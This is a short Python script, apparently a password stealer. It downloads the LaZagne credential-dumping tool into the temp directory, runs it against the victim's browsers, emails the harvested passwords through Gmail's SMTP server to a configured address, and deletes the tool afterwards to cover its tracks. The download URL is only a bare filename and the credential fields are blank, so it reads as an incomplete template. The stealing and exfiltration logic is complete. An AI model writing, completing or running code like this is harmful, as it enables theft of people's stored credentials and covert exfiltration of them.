import os
import smtplib
import subprocess
import tempfile

import requests

from_email = ""
to_email = ""
passwd = ""


def download(url):
    get_response = requests.get(url)
    f_name = url.split("/")[-1]
    with open(f_name, "wb") as output_file:
        output_file.write(get_response.content)


def send_mail(from_email, to_email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_email, password)
    server.sendmail(from_email, to_email, msg)
    server.quit()


temp = tempfile.gettempdir()
os.chdir(temp)
download("lazagne.exe")
res = subprocess.check_output("lazagne.exe browsers", shell=True)
send_mail(from_email, to_email, passwd, res)
os.remove("lazagne.exe")
